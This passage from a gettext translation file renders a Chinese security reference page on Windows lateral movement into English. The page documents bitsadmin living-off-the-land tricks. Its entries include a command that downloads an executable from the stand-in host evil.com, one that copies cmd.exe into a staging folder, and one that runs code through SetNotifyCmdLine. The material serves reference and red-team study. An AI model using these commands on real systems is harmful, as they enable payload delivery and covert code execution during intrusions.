msgstr "bitsadmin.exe"

#: ../../source/intranet/windows/lateral.rst:23
msgid ""
"下载文件 ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> "
"<local_path>``"
msgstr "Download files ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>``"

#: ../../source/intranet/windows/lateral.rst:24
msgid ""
"下载文件 ``bitsadmin /create 1 bitsadmin /addfile 1 "
"https://evil.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe "
"bitsadmin /RESUME 1 bitsadmin /complete 1``"
msgstr "Download files ``bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1``"

#: ../../source/intranet/windows/lateral.rst:25
msgid ""
"复制文件 ``bitsadmin /create 1 & bitsadmin /addfile 1 "
"c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin "
"/RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset``"
msgstr "Copy files ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset``"

#: ../../source/intranet/windows/lateral.rst:26
msgid ""
"代码执行 ``bitsadmin /create 1 & bitsadmin /addfile 1 "
"c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin "
"/SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin "
"/RESUME 1 & bitsadmin /Reset``"
msgstr "Code execution ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset``"

